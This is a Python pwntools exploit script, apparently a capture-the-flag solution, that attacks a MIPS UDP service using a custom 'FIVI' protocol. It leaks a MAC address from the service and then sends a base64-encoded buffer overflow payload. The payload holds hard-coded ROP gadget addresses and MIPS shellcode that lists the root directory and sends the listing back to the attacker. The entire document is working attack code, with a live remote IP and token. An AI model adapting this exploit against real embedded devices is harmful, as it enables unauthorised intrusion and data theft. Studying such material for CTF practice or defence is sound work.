from pwn import *

def pb32(a):
    return p32(a, endian='big')


def be(sc: bytes):
    final = b''
    for x in range(0, len(sc), 4):
        final += sc[x:x + 4][::-1]
    return final


debug = 0
context.arch = 'mips'
context.log_level = 'debug'

if debug:
    # qemu udp hostfwd sucks
    s1 = ssh(user='root', host='localhost', port=5555, password='admin')
    p = s1.process(['nc', '-u', '127.0.0.1', '62720'])
else:
    p1 = remote('47.89.210.186', 57798)
    p1.sendlineafter(b'now:', b't7h0SsXRQLijNOBePkFPMg==')
    p1.recvuntil(b'port is : ')
    port = int(p1.recvuntil(b' ', drop=1))
    log.success(f'Port: {port}')
    sleep(60)

    p = remote('47.89.210.186', port, typ='udp')

payload = b'FIVI' + p32(0x12345678) + b'\x0a' + p16(1) + p16(0xabcd) + b'\xff' * 4 + b'\xff' * 6 + p16(0) + p32(0)
p.send(payload)
p.recv(17)
mac = p.recv(6)
p.recv()
payload = b'FIVI' + b'\x10\x00\x00\xe7' + b'\x0a' + p16(2) + p16(0xabcd) + b'\xff' * 4 + mac + p16(0) + p32(0x8E)
payload = payload.ljust(93, b'\x00')
r = b'a' * 580
r += pb32(0x00413011) * 2
r += pb32(0x402ac0)
r += b'\x00' * 16
r += pb32(0x41b038)
r += b'\x00' * 8
r += pb32(0x0040208c)
r += b'\x10\x00\x00\x09'
r += b'\x00' * 0x14
r += pb32(0x41afd8)
r += pb32(0)
r += b'\x41\x30\x14\x03\xa0\xf8\x09\x00'

context.endian = 'big'
#    {shellcraft.mips.read('$v0','$sp',0x1000)}
buf = asm(f'''
    addiu $sp, $sp, -0x1000
    {shellcraft.mips.open('/')}
    {shellcraft.mips.linux.syscall('SYS_getdents','$v0','$sp',0x1000)}


    {shellcraft.mips.mov('$a0', 3)}
    {shellcraft.mips.mov('$a1', '$sp')}
    {shellcraft.mips.mov('$a2', 0x1000)}
    {shellcraft.mips.mov('$a3', 0)}
    {shellcraft.mips.mov('$v0', 0x0413170)}
    sw      $v0, 16($sp)
    {shellcraft.mips.mov('$v0', 0x10)}
    sw      $v0, 20($sp)
    {shellcraft.mips.mov('$gp', 0x41b030)}
    {shellcraft.mips.mov('$t0', 0x00402940)}
    jalr $t0
    nop
    {shellcraft.mips.linux.exit(0)}
    ''')
r += buf
payload += b64e(r).encode()
p.send(payload)
p.interactive()